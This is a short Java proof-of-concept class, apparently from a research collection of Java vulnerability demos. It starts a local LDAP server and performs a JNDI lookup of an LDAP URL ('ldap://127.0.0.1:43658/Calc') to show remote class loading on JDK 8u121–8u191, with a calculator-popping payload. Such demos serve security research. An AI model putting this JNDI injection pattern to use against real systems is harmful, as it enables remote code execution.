package com.threedr3am.bug.rmi.client;

import com.threedr3am.bug.common.server.LdapServer;
import javax.naming.InitialContext;
import javax.naming.NamingException;

/**
 * @author threedr3am
 */
public class JndiLookupForJdk8u121To191 {

  static {
    LdapServer.run();
  }

  public static void main(String[] args) {
    try {
      new InitialContext().lookup("ldap://127.0.0.1:43658/Calc");
    } catch (NamingException e) {
      e.printStackTrace();
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
}
